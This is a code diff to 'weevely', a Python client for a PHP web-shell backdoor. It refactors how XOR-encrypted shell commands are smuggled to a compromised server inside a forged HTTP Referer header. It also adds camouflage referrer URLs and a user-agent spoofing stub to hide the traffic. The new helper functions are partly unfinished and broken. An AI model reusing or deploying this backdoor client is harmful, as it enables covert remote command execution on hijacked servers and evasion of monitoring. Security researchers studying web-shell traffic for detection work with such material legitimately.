@@ -4,6 +4,11 @@
 from numpy import frombuffer, bitwise_xor, byte
 import getopt, sys, base64, os, urllib2, re, urlparse, os
     
+
+refurls=['https://mail.google.com/mail/?shva=1&inbox=126f670c84e529f0&hl=it', 
+'http://news.google.it/news/story?cf=all&ncl=dP67Os42clPDo8Mt4whHot0vrCj1M&topic=m' ]
+    
+    
 def crypt(text, key):
   text = frombuffer( text, dtype=byte )
   firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
@@ -86,9 +91,10 @@ class weevely:
 
       if moderun=='c':       
 	try:
-	  print self.host.execute(url, pwd, cmnd, 0)
+	  print self.host.execute(cmnd, 0)
 	except Exception, e:
-	  print '! Command execution failed: ' + str(e) + '.'
+	  #print '! Command execution failed: ' + str(e) + '.'
+	  raise
 	return
 
       if moderun=='t':
@@ -131,7 +137,7 @@ class weevely:
       print hostname + '> ',
       cmnd = sys.stdin.readline()
       if cmnd!='\n':
-	print self.host.execute(url, pwd, cmnd, 0)
+	print self.host.execute(cmnd, 0)
 
   def generate(self,key,path):
     f_tocrypt = file('php/text_to_crypt.php')
@@ -174,10 +180,10 @@ class weevely:
       toinject = toinject + f.read()
       
       try:
-	ret = self.host.execute(url, pwd, toinject, 1)
+	ret = self.host.execute(toinject, 1)
       except Exception, e:
-	print '! Module execution failed: ' + str(e) + '.'
-	return
+	#print '! Module execution failed: ' + str(e) + '.'
+	raise
       else:
 	print ret
     
@@ -246,26 +252,26 @@ class host():
     self.url=url
     self.pwd=pwd
     
-    (ret,ret2, e, e2) = self.checkbackdoor(url, pwd)
+    (ret,ret2, e, e2) = self.checkbackdoor()
     if not ret or not ret2:
-      print '! Backdoor verification failed: ' + str(e) + '.' 
+      #print '! Backdoor verification failed: ' + str(e) + '.' 
       return
     self.os=ret2
 
-  def checkbackdoor(self,url,pwd):
+  def checkbackdoor(self):
     
     e = None
     e2 = None
     
     try:
-      ret = self.execute(url, pwd, "echo " + pwd, 0)
+      ret = self.execute("echo " + self.pwd, 0)
     except Exception, e:
       ret = False
-    if pwd != ret:
+    if self.pwd != ret:
       ret = False
     
     try:
-      ret2 = self.execute(url, pwd, "echo PHP_OS;", 1)
+      ret2 = self.execute("echo PHP_OS;", 1)
     except Exception, e2:
       ret2 = False
     if not ret2:
@@ -274,16 +280,19 @@ class host():
     return ret, ret2, e, e2
 	
 
-  def execute(self, url, pwd, cmnd, mode):
+  def execute(self, cmnd, mode=0):
     cmnd=cmnd.strip()
-    cmdstr=crypt(cmnd,pwd)
-    refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
+    cmdstr=crypt(cmnd,self.pwd)
+    self.genRefUrl(cmdstr, mode)
+    
+    
+    refurl='http://www.google.com/asdsds?dsa=' + self.pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
     try: 
-      ret=self.execHTTPGet(refurl,url)
+      ret=self.execHTTPGet(refurl)
     except urllib2.URLError, e:
       raise
     else: 
-      restring='<' + pwd + '>(.*)</' + pwd + '>'
+      restring='<' + self.pwd + '>(.*)</' + self.pwd + '>'
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
@@ -292,11 +301,62 @@ class host():
 	return founded[0].strip()
 
     
-  def execHTTPGet(self, refurl, url):
-    req = urllib2.Request(url)
+  def execHTTPGet(self, refurl):
+    req = urllib2.Request(self.url)
     req.add_header('Referer', refurl)
     r = urllib2.urlopen(req)
     return r.read()    
+  
+  def genUserAgent(self):
+    winXP='Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6'
+    ubu='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14'
+    msie='Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)'
+    
+  def genRefUrl(self,cmndstr,mode):
+    
+    pwd=self.pwd
+    
+    
+
+    mindistance='2083'
+    minr=''
+    
+    for r in refurls:
+      
+      url=urlparse.urlparse(r)
+      params=url[4]
+      keys = [part.split('=')[0] for part in params.split('&')] #params.keys()
+      values = [part.split('=')[1] for part in params.split('&')]
+
+      
+      distance =  []
+      newparams = ''
+    
+      if len(keys) != 3:
+	continue
+      
+      newparams = keys[0] + '=' + self.pwd + '&'
+      distance.append(abs(len(values[0]) - len(self.pwd))) # pwd_distance
+      
+      newparams += keys[1] + '=' + cmndstr + '&'
+      distance.append(abs(len(values[1]) - len(cmndstr)))
+      
+      newparams += keys[2] + '=' + str(mode)
+      distance.append(abs(len(values[2]) - len(str(mode))))
+    
+    
+      newurl = url.geturl().replace(params,newparams)
+      
+      absdistance=0
+      for i in distance:
+	absdistance+=i
+      
+      if absdistance<mindistance:
+	mindistance=absdistance
+	minr=r
+   
+    #print '+ HTTP_REFERER fake header [' + str(refurls.index(minr)) + '] contains ' + str(absdistance) + ' characters more than real one.'
+    
     
 if __name__ == "__main__":
     
